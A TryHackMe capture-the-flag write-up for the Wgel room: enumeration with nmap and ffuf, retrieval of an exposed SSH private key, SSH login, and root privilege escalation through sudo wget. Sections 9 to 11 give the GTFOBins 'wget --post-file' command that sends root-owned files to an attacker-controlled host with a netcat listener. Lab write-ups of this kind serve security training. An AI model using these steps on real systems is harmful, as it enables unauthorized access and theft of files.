# Wgel - TryHackMe Writeup

## Overview

This lab covers the following concepts:

- Nmap service enumeration
- Directory enumeration with FFUF/Gobuster
- File enumeration
- HTML source code analysis
- Retrieving exposed SSH private keys
- SSH authentication using an RSA key
- Linux privilege escalation with `sudo -l`
- Privilege escalation using `wget` (GTFOBins)
- Exfiltrating files using `wget --post-file`

---

# 1. Initial Enumeration

## Nmap Scan

Start by scanning the target.

```bash
sudo nmap -sVC <TARGET_IP>
```

### Result

```text

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Findings

- SSH is available.
- Apache web server is running.

---

# 2. Inspect the Website

Open the website in your browser.

View the **HTML source code** (`Ctrl + U`).

A comment reveals the username:

```text
Jessie don't forget to update the website
```

Save the username:

```
jessie
```

---

# 3. Directory Enumeration

Enumerate web directories.

```bash
ffuf -u http://<TARGET_IP>/FUZZ \
-w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

### Interesting Results

```text
ffuf -u http://10.49.136.92/FUZZ -w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.136.92/FUZZ
 :: Wordlist         : FUZZ: /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 53ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 52ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 51ms]
index.html              [Status: 200, Size: 11374, Words: 3512, Lines: 379, Duration: 32ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
sitemap                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 43ms]
:: Progress: [4752/4752] :: Job [1/1] :: 917 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

The `sitemap` directory looks interesting.

---

# 4. Enumerate the Sitemap Directory

Continue fuzzing inside `/sitemap`.

```bash
ffuf -u http://<TARGET_IP>/sitemap/FUZZ \
-w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

### Interesting Results

```text
ffuf -u http://10.49.136.92/sitemap/FUZZ -w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.136.92/sitemap/FUZZ
 :: Wordlist         : FUZZ: /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 41ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 48ms]
.ssh                    [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 48ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]
css                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 49ms]
fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 41ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 44ms]
index.html              [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 134ms]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 43ms]
:: Progress: [4752/4752] :: Job [1/1] :: 985 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

The `.ssh` directory is publicly accessible.

---

# 5. Retrieve the SSH Private Key

Visit:

```
http://<TARGET_IP>/sitemap/.ssh/

<img width="692" height="278" alt="image" src="https://github.com/user-attachments/assets/31ae7c47-1cda-44f9-b05d-64d3c4f86f6f" />

```

Download the exposed private key:

```
id_rsa
```

Set the correct permissions.

```bash
chmod 600 id_rsa
```

Without proper permissions, SSH will refuse to use the key.

---

# 6. SSH Login

Use the discovered username together with the downloaded private key.

```bash
ssh -i id_rsa jessie@<TARGET_IP>
```

Example:

```bash
ssh -i id_rsa jessie@10.49.136.92
```

Successful login:

```text
Welcome to Ubuntu 16.04.6 LTS
```

---

# 7. User Flag

Explore the user's home directory.

```bash
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
```

Check each directory.

While inspecting the `Documents` directory, the **user flag** can be found.

---

# 8. Check Sudo Privileges

Run:

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```

### Finding

The user can execute `wget` as **root** without entering a password.

---

# 9. Privilege Escalation

Search **GTFOBins** for `wget`.

### Why `wget`?

`wget` is primarily a command-line utility used for:

- Downloading files
- Uploading data using HTTP POST requests
- Sending local file contents to a remote server

Since it supports uploading files, it can be abused to read root-owned files when executed with elevated privileges.

GTFOBins provides the following technique:

```bash
wget --post-file=/path/to/file http://ATTACKER_IP:PORT
```

This sends the contents of the specified file to an attacker-controlled server.

---

# 10. Start a Netcat Listener

On the attacker machine:

```bash
nc -nlvp 4444
```

Output:

```text
Listening on 0.0.0.0 4444
```

---

# 11. Exfiltrate the Root Flag

Execute:

```bash
sudo /usr/bin/wget \
--post-file=/root/root_flag.txt \
http://<ATTACKER_IP>:4444
```

Example:

```bash
sudo /usr/bin/wget \
--post-file=/root/root_flag.txt \
http://192.168.185.130:4444
```

Output:

```text
Connecting to 192.168.185.130:4444... connected.
HTTP request sent...
```

The Netcat listener receives the HTTP POST request containing the contents of:

```text
/root/root_flag.txt
```

The root flag is successfully exfiltrated.

---

# Key Takeaways

- Always inspect HTML source code for developer comments.
- Enumerate directories recursively; hidden files and folders can expose sensitive information.
- Never expose `.ssh` directories or private keys through a web server.
- Check `sudo -l` immediately after obtaining a shell.
- GTFOBins is an excellent resource for abusing allowed binaries.
- `wget` can be abused not only for downloading files but also for uploading local files using HTTP POST, making it useful for file exfiltration during privilege escalation.
